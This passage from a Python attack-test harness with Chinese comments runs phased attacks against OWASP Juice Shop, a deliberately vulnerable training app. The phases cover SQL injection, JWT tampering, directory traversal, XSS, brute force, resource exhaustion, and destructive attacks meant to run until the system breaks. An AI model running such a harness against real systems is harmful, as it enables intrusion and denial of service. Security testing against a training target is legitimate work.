                        "connection refused", "timeout", "memory", "crash",
                        "exception", "error", "failed", "unavailable"
                    ]
                    
                    system_error = any(indicator in content.lower() for indicator in error_indicators) or response.status >= 500
                    
                    self.log_attack(payload['type'], method, str(data)[:100],
                                  response.status, 
                                  "exploited" if system_error else "safe",
                                  f"極端攻擊響應時間: {duration:.1f}s")
                    
                    return {
                        "success": True,
                        "system_error": system_error,
                        "timeout": False,
                        "duration": duration,
                        "status": response.status
                    }
                    
            else:  # GET
                params = data
                async with self.session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    duration = time.time() - start_time
                    content = await response.text()
                    
                    error_indicators = ["internal server error", "500", "503", "502", "504"]
                    system_error = any(indicator in content.lower() for indicator in error_indicators) or response.status >= 500
                    
                    return {
                        "success": True,
                        "system_error": system_error,
                        "timeout": False,
                        "duration": duration,
                        "status": response.status
                    }
                    
        except asyncio.TimeoutError:
            self.log_attack(payload['type'], method, str(data)[:100],
                          0, "exploited", "攻擊導致超時！系統可能受損")
            return {"success": False, "system_error": True, "timeout": True}
            
        except Exception as e:
            self.log_attack(payload['type'], method, str(data)[:100],
                          0, "exploited", f"攻擊引發異常: {e}")
            return {"success": False, "system_error": True, "timeout": False, "exception": str(e)}
    
    async def run_juice_shop_attack_test(self):
        """運行完整的激進 Juice Shop 攻擊測試"""
        print(f"🚀 AIVA Juice Shop 激進攻擊測試開始")
        print(f"🎯 目標: {self.base_url} (OWASP Juice Shop)")
        print(f"⚡ 攻擊強度: {self.attack_intensity}")
        print(f"🔥 最大併發: {self.max_concurrent_requests}")
        print(f"="*80)
        
        await self.setup_session()
        
        try:
            start_time = time.time()
            
            # 執行基本攻擊測試
            print(f"\n🔵 第一階段: 基礎攻擊")
            await self.test_sql_injection_login()
            await self.test_jwt_manipulation()
            await self.test_directory_traversal()
            await self.test_xss_vulnerabilities()
            await self.test_admin_panel_access()
            await self.test_api_information_disclosure()
            
            # 執行進階攻擊測試
            print(f"\n🟡 第二階段: 進階攻擊")
            await self.test_advanced_sql_injection()
            await self.test_file_upload_attacks()
            await self.test_aggressive_brute_force()
            
            # 執行破壞性攻擊
            print(f"\n🔴 第三階段: 破壞性攻擊")
            await self.test_resource_exhaustion()
            await self.test_system_damage_attempts()
            
            # 執行極端破壞攻擊 - 持續攻擊直到系統損壞
            print(f"\n💀 第四階段: 極端破壞攻擊")
            await self.test_extreme_system_damage()
            
            test_duration = time.time() - start_time
            
            # 生成報告
            report_file = self.generate_attack_report()
            self.print_attack_summary()
            
            # 顯示破壞性攻擊結果
            if self.attack_results["system_damage_attempts"]:
                print(f"\n💀 系統破壞嘗試結果:")
                for attempt in self.attack_results["system_damage_attempts"]:
                    print(f"   🔥 {attempt['type']}: {attempt.get('indicators_found', attempt.get('exception', 'No damage detected'))}")
            
            print(f"\n⏱️ 激進攻擊測試耗時: {test_duration:.2f}s")
            print(f"💥 Juice Shop 激進攻擊測試完成！")
            
            return report_file
            
        finally:
            await self.cleanup_session()

async def main():
    """主函數"""
    tester = JuiceShopRealAttackTester()
    report_file = await tester.run_juice_shop_attack_test()
    
    if report_file:
        print(f"\n📄 詳細報告請查看: {report_file}")

if __name__ == "__main__":
    asyncio.run(main())